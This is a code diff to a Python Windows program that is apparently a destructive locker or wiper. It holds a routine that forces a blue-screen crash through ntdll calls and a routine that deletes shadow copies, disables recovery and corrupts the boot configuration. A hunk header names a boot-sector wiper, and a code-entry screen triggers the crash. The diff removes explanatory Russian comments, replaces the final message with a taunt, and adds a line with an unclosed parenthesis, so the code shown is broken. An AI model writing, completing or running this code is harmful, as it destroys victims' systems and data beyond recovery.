@@ -91,7 +91,6 @@ user32.GetMessageW.argtypes = [
     ctypes.POINTER(wintypes.MSG), wintypes.HWND, wintypes.UINT, wintypes.UINT,
 ]
 
-# Исправленные argtypes для NtRaiseHardError и RtlAdjustPrivilege
 ntdll.RtlAdjustPrivilege.argtypes = [
     ctypes.c_ulong, ctypes.c_bool, ctypes.c_bool, ctypes.POINTER(ctypes.c_bool)
 ]
@@ -106,9 +105,8 @@ ntdll.NtRaiseHardError.restype = ctypes.c_ulong
 def force_bsod():
     try:
         b = ctypes.c_bool()
-        ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(b)) # 19 = SeShutdownPrivilege
+        ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(b))
         resp = ctypes.c_ulong()
-        # 0xC000021A = STATUS_SYSTEM_PROCESS_TERMINATED (Critical Process Died)
         ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(resp))
     except Exception:
         pass
@@ -206,13 +204,9 @@ def wipe_ntfs_boot_sectors():
 
 # ================= BCD / RECOVERY DESTRUCTION =================
 def destroy_boot_and_recovery():
-    # 1. Сносим точки восстановления и теневые копии
     subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], capture_output=True, creationflags=0x08000000)
-    # 2. Отключаем WinRE
     subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=0x08000000)
-    # 3. Сносим BCD с флагом /f (без него будет интерактивный запрос)
     subprocess.run(["bcdedit", "/delete", "{default}", "/f"], capture_output=True, creationflags=0x08000000)
-    # 4. Ломаем загрузчик
     subprocess.run(["bcdedit", "/set", "{bootmgr}", "path", "\\NONEXISTENT"], capture_output=True, creationflags=0x08000000)
 
 # ================= ATTEMPTS LOGIC =================
@@ -515,8 +509,8 @@ def main():
                 
                 for w in win.winfo_children():
                     w.destroy()
-                win.configure(bg="#FF0000")
-                tk.Label(win, text="СИСТЕМА УНИЧТОЖЕНА\nПЕРЕУСТАНОВКА WINDOWS", fg="#000000", bg="#FF0000", font=("Impact", 50), justify="center").pack(expand=True, fill="both")
+                win.configure(bg="#FF0000"
+                tk.Label(win, text="ДОИГРАЛСЯ...", fg="#000000", bg="#FF0000", font=("Impact", 60), justify="center").pack(expand=True, fill="both")
                 win.after(3000, force_bsod)
 
         tk.Button(win, text="ПРОВЕРИТЬ", command=check_code,
